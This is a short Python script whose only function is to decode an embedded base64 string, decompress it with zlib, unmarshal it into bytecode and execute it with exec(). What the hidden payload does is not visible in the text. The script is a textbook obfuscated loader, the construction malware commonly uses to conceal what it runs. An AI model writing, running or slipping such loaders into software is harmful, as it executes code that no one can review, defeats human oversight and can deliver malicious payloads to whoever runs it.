import marshal as m
import zlib as z
import base64 as b

x="eJx7zIAEmKD0Zz0gMZUhmCGY0ZuhiCGGIYiJAQMoMZhCWQoM6YyaTC9BTD9NpltciaklGalFxcmJebdYchMz81YyfAbJ3WK2qbC7xWGTm59SmpNqV8QBFGME4mIhIPGBmZGR8TGD4A0Grnb+Jv6rDIJFbEBhAB2aHD8="

exec(
m.loads(
z.decompress(
b.b64decode(x)
)
)
)
